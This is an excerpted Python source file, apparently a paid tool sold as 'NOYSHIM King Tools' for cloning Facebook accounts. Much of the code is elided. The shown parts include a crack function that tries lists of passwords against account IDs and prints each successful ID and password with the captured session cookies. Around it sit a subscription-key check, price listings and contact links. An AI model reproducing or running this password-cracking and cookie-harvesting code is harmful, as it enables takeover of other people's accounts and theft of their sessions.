...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mNOYSHIM')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'NOYSHIM' and password == 'PAID':
...
os.system('espeak -a 300 " Welcome,   to,  NOYSHIM,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/NOYSHIM.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
███╗░░██╗░█████╗░██╗░░░██╗░██████╗██╗░░██╗██╗███╗░░░███╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-NOYSHIM ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • NOYSHIM King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mMR-NOYSHIM ]   ║\33[1;34m   
...
def login():
	banner()
	NOYSHIMj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	NOYSHIMj('\033[0;97m===============================================')
	NOYSHIM= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if NOYSHIM in ['m']:
		public()
	elif NOYSHIM in ['1']:
		crack_file()
	elif NOYSHIM in ['i','0i']:
		result()
	elif NOYSHIM in ['2','02']:
		os.system('xdg-open https://wa.me/+8801864399793')
	elif NOYSHIM in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[NOYSHIM-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#NOYSHIM-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•NOYSHIM-Cp] {idf} • {pw}')     
				...
				#NOYSHIM-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•NOYSHIM-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " NOYSHIM,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/NOYSHIM-King/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m NOYSHIM King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+NOYSHIM+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+NOYSHIM+''+key1
